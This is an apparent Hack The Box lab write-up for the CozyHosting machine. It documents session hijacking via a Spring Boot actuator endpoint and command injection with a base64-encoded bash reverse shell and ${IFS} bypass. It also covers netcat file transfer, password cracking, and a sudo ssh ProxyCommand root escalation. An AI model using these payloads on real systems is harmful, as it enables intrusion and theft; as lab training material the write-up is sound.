---
layout: post
title: CozyHosting (HTB-Easy)
date: 2023-10-9
categories: [Hack The Box]
tags: [linux, postgresql, password-cracking, RCE, command-injection, weak-access-control, ssh, spring-boot-js]
---

### Box Release Date: September 2, 2023

## Machine Summary

Cozyhosting is an easy level challenge on HTB that has a poorly configured site utilizing the Spring Boot JS framework. The site leaks a JSESSIONID (Java Session ID) on one of the endpoints that can be used to access an admin page for the site. The admin page has access to a function that is vulnerable to command injection, this is how you get a foothold on the box. From there, privlege escalation to the one user on the box is done by finding credentials in a .jar file on the box, then using those creds to log into a Postgres db. The db has a hashed password that can be cracked and used to ssh into the box as the user and then you are able to read the first flag. To get root, the ssh binary has poor access controls set and is vulnerable to process injection. 

## Reconnaissance

First we start off the box with a port scan:

```bash
──(h0ax㉿kracken)-[~/htb/boxes/easy/cozy]
└─$ rustscan -a 10.10.11.230 -b 500 -t 500
[sudo] password for h0ax: 
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/rustscan/.rustscan.toml"
[~] File limit higher than batch size. Can increase speed by increasing batch size '-b 1048476'.
Open 10.10.11.230:22
[~] Starting Script(s)
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-02 22:39 UTC
Initiating Ping Scan at 22:39
Scanning 10.10.11.230 [2 ports]
Completed Ping Scan at 22:39, 3.01s elapsed (1 total hosts)
Nmap scan report for 10.10.11.230 [host down, received no-response]
Read data files from: /usr/bin/../share/nmap
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 3.04 seconds

┌──(h0ax㉿kracken)-[~/htb/boxes/easy/cozy]
└─$ sudo nmap --top-ports=100 -T5 -sSCV -Pn 10.10.11.230    
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-02 18:41 EDT
Nmap scan report for cozyhosting.htb (10.10.11.230)
Host is up (1.0s latency).
Not shown: 90 filtered tcp ports (no-response)
PORT     STATE  SERVICE        VERSION
23/tcp   closed telnet
53/tcp   closed domain
80/tcp   open   http           nginx 1.18.0 (Ubuntu)
|_http-title: Cozy Hosting - Home
|_http-server-header: nginx/1.18.0 (Ubuntu)
445/tcp  closed microsoft-ds
554/tcp  closed rtsp
1025/tcp closed NFS-or-IIS
1720/tcp closed h323q931
3306/tcp closed mysql
5900/tcp closed vnc
8888/tcp closed sun-answerbook
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.54 seconds
```

I had to run a second port scan to see what other ports were open since Rustscan was only finding port 22.

But it looks like port 80 will be our attack vector for this box. Curling the IP address for the box returned the following:

```bash
┌──(h0ax㉿kracken)-[~/htb/boxes/easy/cozy]
└─$ curl -i -k 10.10.11.230
HTTP/1.1 301 Moved Permanently
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 02 Oct 2023 22:37:53 GMT
Content-Type: text/html
Content-Length: 178
Connection: keep-alive
Location: http://cozyhosting.htb

<html>
<head><title>301 Moved Permanently</title></head>
<body>
<center><h1>301 Moved Permanently</h1></center>
<hr><center>nginx/1.18.0 (Ubuntu)</center>
</body>
</html>
```

Go ahead and add __cozyhosting.htb__ to you /etc/hosts file.

Now we can visit the webpage!

![landing page](/assets/images/machines/htb/cozy/cozy-landing.png)

While I do some further investigation of this site, I am going to run a web-directory fuzz scan using feroxbuster.

```bash
(h0ax㉿kracken)-[~/htb/boxes/easy/cozy]
└─$ feroxbuster -u http://cozyhosting.htb -w ~/pentestin/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt -k

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://cozyhosting.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /home/h0ax/pentestin/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        1l        2w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       97l      196w     4431c http://cozyhosting.htb/login
204      GET        0l        0w        0c http://cozyhosting.htb/logout
401      GET        1l        1w       97c http://cozyhosting.htb/admin
200      GET       29l      131w    11970c http://cozyhosting.htb/assets/img/pricing-free.png
200      GET       43l      241w    19406c http://cozyhosting.htb/assets/img/pricing-business.png
200      GET       38l      135w     8621c http://cozyhosting.htb/assets/img/logo.png
200      GET       29l      174w    14774c http://cozyhosting.htb/assets/img/pricing-ultimate.png
200      GET      295l      641w     6890c http://cozyhosting.htb/assets/js/main.js
200      GET       38l      135w     8621c http://cozyhosting.htb/assets/img/favicon.png
200      GET       34l      172w    14934c http://cozyhosting.htb/assets/img/pricing-starter.png
200      GET       73l      470w    37464c http://cozyhosting.htb/assets/img/values-1.png
500      GET        1l        1w       73c http://cozyhosting.htb/error
200      GET       81l      517w    40968c http://cozyhosting.htb/assets/img/hero-img.png
200      GET        1l      313w    14690c http://cozyhosting.htb/assets/vendor/aos/aos.js
200      GET       83l      453w    36234c http://cozyhosting.htb/assets/img/values-3.png
200      GET       79l      519w    40905c http://cozyhosting.htb/assets/img/values-2.png
200      GET        1l      218w    26053c http://cozyhosting.htb/assets/vendor/aos/aos.css
200      GET        1l      625w    55880c http://cozyhosting.htb/assets/vendor/glightbox/js/glightbox.min.js
200      GET     2397l     4846w    42231c http://cozyhosting.htb/assets/css/style.css
200      GET     2018l    10020w    95609c http://cozyhosting.htb/assets/vendor/bootstrap-icons/bootstrap-icons.css
200      GET        7l     1222w    80420c http://cozyhosting.htb/assets/vendor/bootstrap/js/bootstrap.bundle.min.js
200      GET       14l     1684w   143706c http://cozyhosting.htb/assets/vendor/swiper/swiper-bundle.min.js
200      GET        0l        0w   194901c http://cozyhosting.htb/assets/vendor/bootstrap/css/bootstrap.min.css
200      GET      285l      745w    12706c http://cozyhosting.htb/
200      GET      285l      745w    12706c http://cozyhosting.htb/index
400      GET        1l       32w      435c http://cozyhosting.htb/plain]
400      GET        1l       32w      435c http://cozyhosting.htb/[
400      GET        1l       32w      435c http://cozyhosting.htb/]
400      GET        1l       32w      435c http://cozyhosting.htb/quote]
400      GET        1l       32w      435c http://cozyhosting.htb/extension]
400      GET        1l       32w      435c http://cozyhosting.htb/[0-9]
```

Nothing of interest here. Only logical next step is to check out the login page and see if it has any injection vulnerabilities.

Before we do that, let's look at the source code for the landing page. Doing this reveals a little bit about the infrastructure that the box was built on. The first few blocks of html code reveal that the site was built using Bootstrap v.5.2.3, specifically using the FlexStart template. Visiting this site https://bootstrapmade.com/flexstart-bootstrap-startup-template/ displays the same image being used on the homepage of the box so this is definitely the right direction. Let's see if we can find vulnerabilities for this Bootstrap version.

After looking online, I was able to determine that the BS version was not vulnerable to anything that could get us a foothold on the machine. At this point I cheated a bit and looked at another writeup for this box and saw that there was an endpoint called __actuator/__. This endpoint indicates that the Spring Boot JS framework is being utilized by the site, which gives us some more info on other places to search.

The documentation for the framework is outlined very well [here](https://www.baeldung.com/spring-boot-actuators). It shows us some other endpoints that we can look for.

After doing a simple find command on my wordlists directory, I discovered that __actuator__ was not in any of the wordlists that I have which explains why I could not find that endpoint with my web-directory fuzzing attempts.

You can skip this step if you want, but I added all of the endpoints from the [Spring Boot Docs](https://www.baeldung.com/spring-boot-actuators) into a text document and added it to my wordlists directory and ran another fuzz scan and found the following endpoints:

```bash
(h0ax㉿kracken)-[~/htb/boxes/easy/cozy]
└─$ feroxbuster -u http://cozyhosting.htb/actuator -w ~/pentestin/wordlists/SecLists/Discovery/Frameworks/spring-boot-actuator.txt -k 

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://cozyhosting.htb/actuator
 🚀  Threads               │ 50
 📖  Wordlist              │ /home/h0ax/pentestin/wordlists/SecLists/Discovery/Frameworks/spring-boot-actuator.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        1l        2w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        1l      120w     4957c http://cozyhosting.htb/actuator/env
200      GET        1l        1w      634c http://cozyhosting.htb/actuator
200      GET        1l        1w       48c http://cozyhosting.htb/actuator/sessions
200      GET        1l        1w       15c http://cozyhosting.htb/actuator/health
200      GET        1l      542w   127224c http://cozyhosting.htb/actuator/beans
[####################] - 1s        19/19      0s      found:4       errors:0      
[####################] - 1s        19/19      32/s    http://cozyhosting.htb/actuator/
```

Of all the found endpoints, __/beans__ has great overall configuration info that would be great to learn more about what is going on under the hood, but obviously the __/sessions__ endpoint is really what is of interest here. Visiting the endpoint (http://cozyhosting.htb/actuator/sessions) returns a Java Session Token for a user called kanderson.

![jwt](/assets/images/machines/htb/cozy/jwt.png)

If we look back at our previous web-directory fuzz scan, we can see that there is an __/admin__ endpoint available on the device. The original scan returned a 401 error (*Unauthorized*), our best bet here is to see if we can intercept a GET request to that endpoint in Burpsuite and then change the token there to the one assigned to kanderson.

*NOTE* - While trying to get access to the admin page I had an issue with getting my token I got to work. I then tried curling the /sessions endpoint and got a different token for kanderson than the one I previously got from visiting the endpoint in a browser. So on the box there must be something in the JS code that has the tokens that are assigned to kanderson, change every 5 or so minutes. So right before you go to intercept a GET request to the /admin endpoint, run __curl -i -k http://cozyhosting.htb/actuator/sessions__ and use the returned token in Burp to get access.

So to get access to the admin page do the following:

First get the token

```bash
(h0ax㉿kracken)-[~/htb/boxes/easy/cozy]
└─$ curl -i -k http://cozyhosting.htb/actuator/sessions
HTTP/1.1 200 
Server: nginx/1.18.0 (Ubuntu)
Date: Fri, 06 Oct 2023 22:18:17 GMT
Content-Type: application/vnd.spring-boot.actuator.v3+json
Transfer-Encoding: chunked
Connection: keep-alive
X-Content-Type-Options: nosniff
X-XSS-Protection: 0
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Pragma: no-cache
Expires: 0
X-Frame-Options: DENY

{"DED42B5E37E98F1B542B92AFD040B051":"kanderson","B6E4A042FE79F1F92BC818D696BD350F":"UNAUTHORIZED"}
```

Copy the token into burp and the forward the request

![burp](/assets/images/machines/htb/cozy/burp-jwt.png)

And now you should have access to the admin page!

![admin page](/assets/images/machines/htb/cozy/admin.png)

Looking around on this page there is not much but the __Automatic Patching__ function on the site is of definite interest since it looks like we can connect to the machine as long as we have our public key in the target's authorized_keys file. Let's look around here and see what we can find. I am going to put a test payload of __test__ into both fields and capture the request in Burp.

![executessh](/assets/images/machines/htb/cozy/executessh.png)

Looking at this request we can see that an endpoint called __/executessh__ is being called from the /admin endpoint. This is definitely the intended target. Now, we need to find a way to inject code.

To test for injection vulnerabilities we need to use Burp again. I first tried putting in the IP I have for my machine on the HTB VPN and used my machine username as well and got the following response from Burp repeater:

```
HTTP/1.1 302 
Server: nginx/1.18.0 (Ubuntu)
Date: Fri, 06 Oct 2023 23:07:57 GMT
Content-Length: 0
Location: http://cozyhosting.htb/admin?error=ssh: connect to host 10.10.16.20 port 22: Connection timed out
Connection: close
X-Content-Type-Options: nosniff
X-XSS-Protection: 0
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Pragma: no-cache
Expires: 0
X-Frame-Options: DENY
```

I then tried using the loopback address too with my username:

```
HTTP/1.1 302 
Server: nginx/1.18.0 (Ubuntu)
Date: Fri, 06 Oct 2023 23:12:18 GMT
Content-Length: 0
Location: http://cozyhosting.htb/admin?error=Host key verification failed.
Connection: close
X-Content-Type-Options: nosniff
X-XSS-Protection: 0
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Pragma: no-cache
Expires: 0
X-Frame-Options: DENY
```

We get two different errors, one for SSH and one for Key Verification. This does not strike me as odd and definitely the intended functionality expected from the target. The second error though raises one question, exactly how is it reading usernames that are POSTed to the machine? This error occurs when a SSH client cannot verify the authenticity of the remote server it is trying to connect to. This makes me believe that data is getting passed to and from a function in their application, that passes input into a shell command, without properly sanitizing the input (*Very Insecure*).

I tried a few different common payloads to see if I could run the __id__ command. Doing a simple __'id__ returned promising results.

![inject1](/assets/images/machines/htb/cozy/inject-cozy.png)

My assumption concerning how data was being read from the username field was spot on, now we just need to find a payload that allows us to escape out of the script being run target-side, to execute commands on the target.

After some testing and online searching, I found a great little guide by [HackTricks](https://book.hacktricks.xyz/pentesting-web/command-injection) that is great for testing. I found that using the following payload actually works and we get RCE on the target.
```
;``
###payload goes into between the two apostrophes### 
```

![injection success](/assets/images/machines/htb/cozy/inject-works.png)

Now that we have RCE confirmed, all we need to do is upload a reverse shell. I personally think the best way to do this will be to base64 encode a shell and tell the target to decode it and then run it. Should look like this:

```bash
bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1 = YmFzaCAtaSA+JiAvZGV2L3RjcC9ZT1VSX0lQL1lPVVJfUE9SVCAwPiYxCg==

echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC9ZT1VSX0lQL1lPVVJfUE9SVCAwPiYxCg==' | base64 -d | bash

### The encoded part that you put in the echo cmd will be different
```

We also will need to url encode the payload too. That can be done easily in Burp by just highlighting what you want to encode and then selecting URL encode key characters.

Below is what my payload is:

![inject 2](/assets/images/machines/htb/cozy/almost-there.png)

As we can see from above, the command injection failed since we are not allowed to use spaces. To bypass this you can do a super simple trick which is to use __${IFS}__ in place of a space (*IFS = Internal Field Separator*).

Once you have replaced the blank spaces, highlight your payload and right click Convert Selection > Encode All Characters.

Payload pre URL encoding:

```
;`echo${IFS}'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4yMC85OTk5IDA+JjEK'${IFS}|base64${IFS}-d${IFS}|${IFS}bash`
```

Payload post URL encoding:

```
%3b%60%65%63%68%6f%24%7b%49%46%53%7d%27%59%6d%46%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%78%4d%43%34%78%4d%43%34%78%4e%69%34%79%4d%43%38%35%4f%54%6b%35%49%44%41%2b%4a%6a%45%4b%27%24%7b%49%46%53%7d%7c%62%61%73%65%36%34%24%7b%49%46%53%7d%2d%64%24%7b%49%46%53%7d%7c%24%7b%49%46%53%7d%62%61%73%68%60
```

Once you have everything above done go ahead and start a netcat listener and send the payload to the target. It should hang and return a 504 error if the RCE attempt is successful.

![rev success](/assets/images/machines/htb/cozy/rev.png)

I sent my payload and it worked! Now we have access as __app__ to the machine.

```bash
(h0ax㉿kracken)-[~/htb/boxes/easy/cozy]
└─$ nc -lvnp 9999    
listening on [any] 9999 ...
connect to [10.10.16.20] from (UNKNOWN) [10.10.11.230] 43648
bash: cannot set terminal process group (1064): Inappropriate ioctl for device
bash: no job control in this shell
app@cozyhosting:/app$ id
id
uid=1001(app) gid=1001(app) groups=1001(app)
```

Now I am going to upgrade my shell (*Python isn't on the target so I have to do it the long way*). Below are the steps that I use to do so:

```bash
script /dev/null -c bash

# ^Z (CTRL Z) to background the shell

stty raw -echo;fg

reset #type 'screen' when asked for terminal type

export TERM=xterm # allows you to clear STDOUT

# You can set row and column specifics on the target to make it match the settings on your host terminal, I will skip this for now
```

Now that we have our shell setup, let's see what we need to do to be able to read the user flag.

Looks like the user flag is in the user josh's home directory and we need to find a way to elevate our privs to that user.

```bash
app@cozyhosting:/app$ pwd
/app
app@cozyhosting:/app$ ls -alh /home
total 12K
drwxr-xr-x  3 root root 4.0K May 18 15:03 .
drwxr-xr-x 19 root root 4.0K Aug 14 14:11 ..
drwxr-x---  4 josh josh 4.0K Oct  6 00:46 josh
app@cozyhosting:/app$ cd /home/josh
bash: cd: /home/josh: Permission denied
app@cozyhosting:/app$
```

There is a large .jar file in the /app directory. Let's get this to our machine and see what we can do with it.

```bash
app@cozyhosting:/app$ ls -alh
total 58M
drwxr-xr-x  2 root root 4.0K Aug 14 14:11 .
drwxr-xr-x 19 root root 4.0K Aug 14 14:11 ..
-rw-r--r--  1 root root  58M Aug 11 00:45 cloudhosting-0.0.1.jar
```

To get it to your machine we can use netcat both on our machine and the target. 

```bash
# On the target server. Run this first

nc -l -p pick_a_port < cloudhosting-0.0.1.jar
```

```bash
# On the attacking machine

nc ip_of_target port_of_target > ch.jar
```

Now that we have it in our machine lets extract the contents of the jar file by running:

```bash
jar xf jar_archive.jar
```

There are three directories here. The boot one sounds like it would be a good place to start. Let's grep through the file to see if we can find credentials.

```bash
(h0ax㉿kracken)-[~/htb/boxes/easy/cozy]
└─$ grep -rwni 'password' BOOT-INF                     
BOOT-INF/classes/templates/login.html:57:                                        <label for="yourPassword" class="form-label">Password</label>
BOOT-INF/classes/templates/login.html:58:                                        <input type="password" name="password" class="form-control" id="yourPassword"
BOOT-INF/classes/templates/login.html:60:                                        <div class="invalid-feedback">Please enter your password!</div>
BOOT-INF/classes/templates/login.html:73:                                    <p th:if="${param.error}" class="text-center small">Invalid username or password</p>
BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.css:1276:.ri-lock-password-fill:before { content: "\eecf"; }
BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.css:1277:.ri-lock-password-line:before { content: "\eed0"; }
BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.svg:3710:    <glyph glyph-name="lock-password-fill"
BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.svg:3713:    <glyph glyph-name="lock-password-line"
BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.less:1277:.ri-lock-password-fill:before { content: "\eecf"; }
BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.less:1278:.ri-lock-password-line:before { content: "\eed0"; }
BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.symbol.svg:6155:</symbol><symbol viewBox="0 0 24 24" id="ri-lock-password-fill">
BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.symbol.svg:6160:</symbol><symbol viewBox="0 0 24 24" id="ri-lock-password-line">
grep: BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.eot: binary file matches
grep: BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.ttf: binary file matches
grep: BOOT-INF/classes/htb/cloudhosting/scheduled/FakeUser.class: binary file matches
grep: BOOT-INF/classes/htb/cloudhosting/database/CozyUser.class: binary file matches
grep: BOOT-INF/classes/htb/cloudhosting/secutiry/SecurityConfig.class: binary file matches
BOOT-INF/classes/application.properties:12:spring.datasource.password=Vg&nv....... #pass here
grep: BOOT-INF/lib/spring-security-crypto-6.0.1.jar: binary file matches
```

Nice we found a password! Let's also open up that file in a text editor.

```
server.address=127.0.0.1
server.servlet.session.timeout=5m
management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
management.endpoint.sessions.enabled = true
spring.datasource.driver-class-name=org.postgresql.Driver
spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
spring.jpa.hibernate.ddl-auto=none
spring.jpa.database=POSTGRESQL
spring.datasource.platform=postgres
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
spring.datasource.username=postgres
spring.datasource.password=Vg&nv.......
```

Looking at the contents here we can see that there is a postgres database running on the box. Let's see if we can login using that password.

```bash
app@cozyhosting:/app$ psql -h 127.0.0.1 -U postgres -W 
Password: 
psql (14.9 (Ubuntu 14.9-0ubuntu0.22.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

postgres=#
```

We can! Let's see what we can find in here.

```bash
postgres=# \l
                                   List of databases
    Name     |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   
-------------+----------+----------+-------------+-------------+-----------------------
 cozyhosting | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 postgres    | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 template0   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
             |          |          |             |             | postgres=CTc/postgres
 template1   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
             |          |          |             |             | postgres=CTc/postgres
```

There is a db called cozyhosting, lets context to this db.

```bash
postgres=# \c cozyhosting
Password: 
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
You are now connected to database "cozyhosting" as user "postgres".
cozyhosting=# \dt
         List of relations
 Schema | Name  | Type  |  Owner   
--------+-------+-------+----------
 public | hosts | table | postgres
 public | users | table | postgres
(2 rows)

cozyhosting=# select * from users;
   name    |                           password                           | role  
-----------+--------------------------------------------------------------+-------
 kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
 admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
(2 rows)
```

I was able to find a hashed password for the user kanderson. Let's crack it with john.

```bash
(h0ax㉿kracken)-[~/htb/boxes/easy/cozy]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
manc...... (?) #Pass is here
```

Nice we got the password and we can SU to the Josh user successfully now with that password. We can also grab the first flag.

```bash
app@cozyhosting:/app$ su josh
Password: 
josh@cozyhosting:/app$ id
uid=1003(josh) gid=1003(josh) groups=1003(josh)
josh@cozyhosting:/app$ cd
josh@cozyhosting:~$ ls -alh
total 40K
drwxr-x--- 4 josh josh 4.0K Oct  6 00:46 .
drwxr-xr-x 3 root root 4.0K May 18 15:03 ..
lrwxrwxrwx 1 root root    9 May 11 19:34 .bash_history -> /dev/null
-rw-r--r-- 1 josh josh  220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 josh josh 3.7K Jan  6  2022 .bashrc
drwx------ 2 josh josh 4.0K May 18 14:47 .cache
-rw------- 1 josh josh   20 May 18 22:14 .lesshst
-rw-r--r-- 1 josh josh  807 Jan  6  2022 .profile
lrwxrwxrwx 1 root root    9 May 21 13:10 .psql_history -> /dev/null
drwx------ 2 josh josh 4.0K Oct  6 00:46 .ssh
-rw-r----- 1 root josh   33 Oct  3 17:35 user.txt
-rw-r--r-- 1 josh josh   39 Aug  8 10:19 .vimrc
josh@cozyhosting:~$ cat user.txt 
b57a0f7fe23....................
```

Once on the box I loaded up both Pspy64 and linpeas, did not see anything of interest there. The next thing I did was run __sudo -l__, using the password I got for the user Josh. It luckily worked and I saw the following:

```bash
josh@cozyhosting:~$ sudo -l
[sudo] password for josh: 
Matching Defaults entries for josh on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User josh may run the following commands on localhost:
    (root) /usr/bin/ssh *
```

This is definitely odd, this means that the Josh user has unrestricted privleges to run ssh as root and can specify any argument. Most likely our attack vector. When it comes to doing privlege escalation on linux binaries, I always like to check out [GTFObins](https://gtfobins.github.io/) to see if there is a solution. Interestingly enough, GTFObins has an exploit we can use in a situation such as ours.

```bash
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
```

This exploit first works by utilizing the __ProxyCommand__ option to establish an ssh session through an intermediary host (specified to start a session with itself in this exploit). The ProxyCommand variable is set to one argument ;sh 0<&2 1>&2. This command attempts to execute a shell with input/output redirection, this basically means we can inject a shell into the ssh process and since the process is running as root our injected shell will have root privleges.

When we run the exploit, we are able to get a shell as root!

```bash
josh@cozyhosting:~$ sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
[sudo] password for josh: 
$ id
uid=0(root) gid=0(root) groups=0(root)
$ cat /root/root.txt
d4feb0a4d24...
```

 
Got the flag, see you in the next one!